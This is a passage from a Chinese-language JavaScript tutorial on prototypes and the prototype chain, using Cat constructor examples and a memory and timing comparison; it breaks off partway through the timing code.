<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// 一个空对象，但有constructor属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// prototype对象的内容</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-comment">// 输出大致如下：</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//     constructor: function Cat(name) {...},</span>
<span class="hljs-comment">//     __proto__: Object.prototype</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-30">4.2.2 实例与原型的关系</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 在原型上添加共享方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
};

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
};

<span class="hljs-comment">// 创建实例</span>
<span class="hljs-keyword">const</span> garfield = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>);
<span class="hljs-keyword">const</span> doraemon = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"哆啦A梦"</span>);

<span class="hljs-comment">// 神奇的事情发生了！</span>
garfield.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "加菲猫在吃东西"</span>
doraemon.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "哆啦A梦在吃东西"</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(garfield.<span class="hljs-property">eat</span> === doraemon.<span class="hljs-property">eat</span>); <span class="hljs-comment">// true ✓</span>
<span class="hljs-comment">// 内存中只有一个eat函数，两个实例共享它！</span>
</code></pre>
<h4 data-id="heading-31">4.2.3 原型链的查找机制</h4>
<p>当访问一个对象的属性时，JavaScript引擎会：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 详细步骤演示</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">type</span> = <span class="hljs-string">"猫"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃鱼"</span>);
};

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-comment">// 访问 cat.eat() 时发生的事情：</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 查找 cat.eat() 的过程 ==="</span>);

<span class="hljs-comment">// 第一步：检查cat自身是否有eat属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1. cat自身有eat吗？"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"eat"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 第二步：如果没有，查找cat.__proto__（即Cat.prototype）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"2. cat.__proto__有eat吗？"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"eat"</span>)); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 第三步：找到！执行Cat.prototype.eat，但this指向cat</span>
<span class="hljs-comment">// 相当于：Cat.prototype.eat.call(cat)</span>

<span class="hljs-comment">// 第四步：如果Cat.prototype也没有，继续查找Cat.prototype.__proto__（Object.prototype）</span>
<span class="hljs-comment">// 第五步：如果还没有，继续查找Object.prototype.__proto__（null）</span>
<span class="hljs-comment">// 第六步：找到null，返回undefined</span>

<span class="hljs-comment">// 可视化原型链：</span>
<span class="hljs-comment">// cat </span>
<span class="hljs-comment">//   → [[Prototype]]: Cat.prototype</span>
<span class="hljs-comment">//        → [[Prototype]]: Object.prototype</span>
<span class="hljs-comment">//             → [[Prototype]]: null</span>
</code></pre>
<h4 data-id="heading-32">4.2.4 <code>__proto__</code> vs <code>prototype</code> 的区别</h4>
<p>这是初学者最容易混淆的概念，让我们彻底搞清楚：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 关键区别 ==="</span>);

<span class="hljs-comment">// 1. prototype是函数的属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Cat有prototype吗？"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"prototype"</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat有prototype吗？"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"prototype"</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// 2. __proto__是对象的属性（每个对象都有）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat有__proto__吗？"</span>, cat.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">"__proto__"</span>)); <span class="hljs-comment">// false（但可以访问）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.__proto__存在吗？"</span>, cat.<span class="hljs-property">__proto__</span> !== <span class="hljs-literal">undefined</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 3. 重要关系：实例的__proto__指向构造函数的prototype</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.__proto__ === Cat.prototype?"</span>, cat.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 4. 构造函数的prototype的constructor指向构造函数本身</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Cat.prototype.constructor === Cat?"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 记忆口诀：</span>
<span class="hljs-comment">// - 函数（构造函数）有prototype（用于构建原型链）</span>
<span class="hljs-comment">// - 对象（实例）有__proto__（用于查找原型链）</span>
<span class="hljs-comment">// - 实例的__proto__指向构造函数的prototype</span>
</code></pre>
<h4 data-id="heading-33">4.2.5 原型链的可视化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 让我们画一个原型链的完整图</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-comment">// 设置原型链</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Cat</span>;

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>, <span class="hljs-string">"白色"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 完整的原型链 ==="</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat自身属性:"</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(cat)); <span class="hljs-comment">// ["name", "color"]</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"cat.__proto__ === Cat.prototype?"</span>, cat.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Cat.prototype.__proto__ === Animal.prototype?"</span>, <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Animal.prototype.__proto__ === Object.prototype?"</span>, <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Object.prototype.__proto__ === ?"</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>); <span class="hljs-comment">// null</span>

<span class="hljs-comment">// 原型链：cat → Cat.prototype → Animal.prototype → Object.prototype → null</span>
</code></pre>
<h3 data-id="heading-34">4.3 原型模式的完整实现</h3>
<h4 data-id="heading-35">4.3.1 标准原型模式写法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 步骤1：定义构造函数（处理实例特有属性）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color, age</span>) {
    <span class="hljs-comment">// 实例特有属性放在构造函数中</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age || <span class="hljs-number">1</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createdAt</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">// 每个实例创建时间不同</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>).<span class="hljs-title function_">substr</span>(<span class="hljs-number">2</span>, <span class="hljs-number">9</span>); <span class="hljs-comment">// 每个实例唯一ID</span>
}

<span class="hljs-comment">// 步骤2：在原型上添加共享方法和属性</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
    <span class="hljs-comment">// 重要：必须设置constructor，否则会丢失</span>
    <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Cat</span>,
    
    <span class="hljs-comment">// 共享属性（所有猫都一样）</span>
    <span class="hljs-attr">species</span>: <span class="hljs-string">"猫科动物"</span>,
    <span class="hljs-attr">kingdom</span>: <span class="hljs-string">"动物界"</span>,
    <span class="hljs-attr">hasTail</span>: <span class="hljs-literal">true</span>,
    
    <span class="hljs-comment">// 共享方法（所有猫都一样）</span>
    <span class="hljs-attr">eat</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>(<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.color}</span>)在吃<span class="hljs-subst">${food}</span>`</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> += <span class="hljs-number">10</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 支持链式调用</span>
    },
    
    <span class="hljs-attr">sleep</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">hours</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>要睡<span class="hljs-subst">${hours}</span>小时`</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> += hours * <span class="hljs-number">5</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-attr">play</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>在玩毛线球`</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> -= <span class="hljs-number">5</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    },
    
    <span class="hljs-attr">getInfo</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.color}</span>色，<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>岁`</span>;
    },
    
    <span class="hljs-comment">// 计算属性</span>
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">isKitten</span>() {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> &lt; <span class="hljs-number">1</span>;
    },
    
    <span class="hljs-keyword">get</span> <span class="hljs-title function_">energyLevel</span>() {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> &gt; <span class="hljs-number">80</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"精力充沛"</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> &gt; <span class="hljs-number">50</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"状态良好"</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">energy</span> &gt; <span class="hljs-number">20</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">"有点疲惫"</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"需要休息"</span>;
    }
};

<span class="hljs-comment">// 步骤3：添加原型属性（初始化值）</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">energy</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// 初始能量</span>

<span class="hljs-comment">// 步骤4：使用</span>
<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>, <span class="hljs-string">"黄色"</span>, <span class="hljs-number">5</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"小白猫"</span>, <span class="hljs-string">"白色"</span>, <span class="hljs-number">0.5</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-title function_">getInfo</span>()); <span class="hljs-comment">// "加菲猫，黄色色，5岁"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-title function_">getInfo</span>()); <span class="hljs-comment">// "小白猫，白色色，0.5岁"</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">isKitten</span>); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">isKitten</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 链式调用</span>
cat1.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"鱼"</span>).<span class="hljs-title function_">sleep</span>(<span class="hljs-number">8</span>).<span class="hljs-title function_">play</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">energyLevel</span>); <span class="hljs-comment">// "状态良好"</span>

<span class="hljs-comment">// 验证共享性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">eat</span> === cat2.<span class="hljs-property">eat</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span> === cat2.<span class="hljs-property">species</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-36">4.3.2 动态修改原型</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"第一批猫"</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"第二批猫"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 动态修改原型的效应 ==="</span>);

<span class="hljs-comment">// 1. 在创建实例后添加原型方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
};

<span class="hljs-comment">// 所有已存在的实例都能立即使用新方法！</span>
cat1.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第一批猫在吃东西"</span>
cat2.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第二批猫在吃东西"</span>

<span class="hljs-comment">// 2. 覆盖原型方法</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在大吃特吃！"</span>);
};

cat1.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第一批猫在大吃特吃！"</span>
cat2.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// "第二批猫在大吃特吃！"</span>

<span class="hljs-comment">// 3. 在原型上添加属性</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"</span>

<span class="hljs-comment">// 4. 重要：如果实例已有同名属性，会遮蔽原型属性</span>
cat1.<span class="hljs-property">species</span> = <span class="hljs-string">"超级猫"</span>; <span class="hljs-comment">// 在实例上创建属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span>); <span class="hljs-comment">// "超级猫"（实例属性优先）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"（还是原型属性）</span>

<span class="hljs-comment">// 5. 删除实例属性，恢复访问原型</span>
<span class="hljs-keyword">delete</span> cat1.<span class="hljs-property">species</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">species</span>); <span class="hljs-comment">// "猫"（又访问到原型了）</span>

<span class="hljs-comment">// 6. 谨慎：修改内置原型</span>
<span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sum</span>) {
    <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sum</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>);
    };
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">sum</span>()); <span class="hljs-comment">// 6</span>

<span class="hljs-comment">// 但注意：修改内置原型有风险，可能与其他库冲突</span>
</code></pre>
<h4 data-id="heading-37">4.3.3 原型的性能优势</h4>
<p>让我们用数据说话：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 性能测试：构造函数模式 vs 原型模式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">TestConstructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method1</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>; };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method2</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>(); };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method3</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-property">length</span>; };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method4</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>); };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">method5</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>); };
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">TestPrototype</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method1</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>; };
<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method2</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>(); };
<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method3</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-property">length</span>; };
<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method4</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>); };
<span class="hljs-title class_">TestPrototype</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method5</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>); };

<span class="hljs-comment">// 内存占用测试</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"=== 内存占用对比 ==="</span>);

<span class="hljs-keyword">const</span> count = <span class="hljs-number">10000</span>;
<span class="hljs-keyword">let</span> memoryConstructor = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> memoryPrototype = <span class="hljs-number">0</span>;

<span class="hljs-comment">// 估算：每个函数对象约1KB，每个字符串属性约0.1KB</span>
<span class="hljs-comment">// 构造函数模式：10000实例 × (5个方法 × 1KB + 1个属性 × 0.1KB) ≈ 51000KB ≈ 49.8MB</span>
<span class="hljs-comment">// 原型模式：10000实例 × (1个属性 × 0.1KB) + 5个方法 × 1KB ≈ 1005KB ≈ 0.98MB</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`创建<span class="hljs-subst">${count}</span>个实例的理论内存占用：`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`构造函数模式：约 <span class="hljs-subst">${(count * (<span class="hljs-number">5</span> * <span class="hljs-number">1024</span> + <span class="hljs-number">102</span>) / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">1</span>)}</span>MB`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`原型模式：约 <span class="hljs-subst">${((count * <span class="hljs-number">102</span> + <span class="hljs-number">5</span> * <span class="hljs-number">1024</span>) / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">1</span>)}</span>MB`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`节约：约 <span class="hljs-subst">${((count * <span class="hljs-number">5</span> * <span class="hljs-number">1024</span>) / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>).toFixed(<span class="hljs-number">1</span>)}</span>MB`</span>);

<span class="hljs-comment">// 实际测试</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\n=== 实际创建时间测试 ==="</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">"构造函数模式"</span>);
<span class="hljs-keyword">const</span> consInstances = [];
